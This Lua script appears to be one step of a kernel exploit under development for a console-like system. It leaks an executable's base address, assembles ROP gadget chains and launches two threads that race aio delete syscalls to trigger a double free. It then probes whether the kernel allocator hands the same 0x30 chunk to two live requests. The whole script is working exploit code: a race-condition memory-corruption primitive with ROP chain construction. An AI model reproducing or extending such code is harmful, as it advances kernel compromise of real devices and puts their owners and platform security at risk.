-- CRASH_CLASS: HIGH
-- PROBE 524b: does the allocator hand out a double-freed C twice?
--
-- Context: two thr_new children deleting the same 100 aio ids produced 54 ids
-- where BOTH deletes reported status 0 (523c). Serialized second deletes return
-- 0x80020003 (498a), so both callers ran the last-item path and both freed the
-- 0x30 context C. The next question is what the allocator did with the
-- duplicate: if the free list now holds one chunk twice, the next creates of
-- that size class all get the same address, so two live aio requests end up
-- sharing their 0x30 context. That is observable: create several requests at
-- the same time, delete one, then poll the others.
--
-- Layout: create count=1 makes five allocations (D 0x28, S 0x58, T 0x30,
-- P 0x08, C 0x30). A duplicated 0x30 free entry is consumed by T of one create
-- and by C of the same or a later create.
--
-- This probe races 20 ids (expect a handful of doubles), then creates four
-- requests at once and polls/deletes them interleaved, printing every status.

print("=== PROBE 524b: DOUBLE-FREE ALLOCATOR EFFECT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function hex(v) return string.format("%08X", (v or 0) % 4294967296) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local poll_cell = memory.alloc(16)

local function create_polled()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok or N(rv) ~= 0 then return nil, "create-ret" end
    local id = rd(N(out_id))
    if id == nil then return nil, "no-id" end
    wd(N(poll_cell), id)
    local pst = memory.alloc(16)
    wd(N(pst), 0xCCCCCCCC)
    local pok = pcall(function() sc_poll(uint64(N(poll_cell)), uint64(1), uint64(N(pst))) end)
    if not pok then return id, "poll-call" end
    return id, hex(rd(N(pst)))
end

local function delete_id(id)
    local cell = memory.alloc(16)
    wd(N(cell), id)
    local st = memory.alloc(16)
    wd(N(st), 0xCCCCCCCC)
    local ok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
    return ok, hex(rd(N(st)))
end

-- [B] create the race set
local IDS = 100
local ids_buf = memory.alloc(IDS * 4 + 64)
local made = {}
for i = 1, IDS do
    local id, st = create_polled()
    if id == nil then print("    create failed " .. tostring(st)); break end
    made[#made + 1] = id
    wd(N(ids_buf) + (i - 1) * 4, id)
end
print(string.format("[B] race set created=%d", #made))
if #made < IDS then return end

-- [C] two children, same ids
local function build_child(count)
    local status = memory.alloc(count * 4 + 64)
    for i = 0, count * 4 - 4, 4 do wd(N(status) + i, 0xCCCCCCCC) end
    local CHAIN_MAX = 0x8000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    for i = 0, count - 1 do
        emit(g_pop_rdi); emit(uint64(N(ids_buf) + i * 4))
        emit(g_pop_rsi); emit(uint64(1))
        emit(g_pop_rdx); emit(uint64(N(status) + i * 4))
        emit(g_pop_rax); emit(uint64(662))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, N(status)
end

local pars, stats = {}, {}
for c = 1, 2 do pars[c], stats[c] = build_child(IDS) end
for c = 1, 2 do
    local ok, rv = pcall(function() return sc_thr_new(pars[c], uint64(0x38)) end)
    print(string.format("    launch %d ok=%s rv=%s alive=%s", c, tostring(ok), tostring(N(rv)), tostring(alive())))
end

-- [D] wait for both children, tally
local spins = 0
while spins < 200000 do
    local done = true
    for i = 0, IDS - 1 do
        if rd(N(stats[1]) + i * 4) == -858993460 or rd(N(stats[2]) + i * 4) == -858993460 then done = false; break end
    end
    if done then break end
    spins = spins + 1
end
local one, two, other = 0, 0, 0
local doubles = {}
for i = 0, IDS - 1 do
    local a = rd(N(stats[1]) + i * 4)
    local b = rd(N(stats[2]) + i * 4)
    local z = 0
    if a == 0 then z = z + 1 end
    if b == 0 then z = z + 1 end
    if z == 1 then one = one + 1 elseif z == 2 then two = two + 1; doubles[#doubles+1] = made[i+1] end
    if (a ~= 0 and a ~= 0x80020003 and a ~= 0x80020010) or (b ~= 0 and b ~= 0x80020003 and b ~= 0x80020010) then other = other + 1 end
end
print(string.format("[D] one-zero=%d two-zero=%d other=%d alive=%s", one, two, other, tostring(alive())))
if not alive() then return end

-- [E] four requests alive at once, then interleaved deletes
print("")
print("[E] four concurrent requests")
local live = {}
for i = 1, 4 do
    local id, st = create_polled()
    print(string.format("    create %d id=%s poll=%s", i, tostring(id), tostring(st)))
    if id ~= nil then live[#live + 1] = id end
    if not alive() then print("    DIED during create"); return end
end

print("    deleting 1 and 3, then polling 2 and 4")
for _, idx in ipairs({1, 3}) do
    if live[idx] then
        local ok, st = delete_id(live[idx])
        print(string.format("        delete %d ok=%s status=%s alive=%s", idx, tostring(ok), st, tostring(alive())))
        if not alive() then return end
    end
end

for _, idx in ipairs({2, 4}) do
    if live[idx] then
        local cell = memory.alloc(16)
        wd(N(cell), live[idx])
        local pst = memory.alloc(16)
        wd(N(pst), 0xCCCCCCCC)
        local ok = pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(pst))) end)
        print(string.format("        poll %d ok=%s status=%s alive=%s", idx, tostring(ok), hex(rd(N(pst))), tostring(alive())))
        if not alive() then return end
    end
end

for _, idx in ipairs({2, 4}) do
    if live[idx] then
        local ok, st = delete_id(live[idx])
        print(string.format("        delete %d ok=%s status=%s alive=%s", idx, tostring(ok), st, tostring(alive())))
        if not alive() then return end
    end
end

-- [F] health
local okc, clean = 0, 0
for i = 1, 4 do
    local id, _ = create_polled()
    if id ~= nil then
        okc = okc + 1
        local ok, st = delete_id(id)
        if ok and st == "00000000" then clean = clean + 1 end
    end
end
print(string.format("[F] health created=%d clean=%d alive=%s", okc, clean, tostring(alive())))
print("=== PROBE 524b COMPLETE ===")
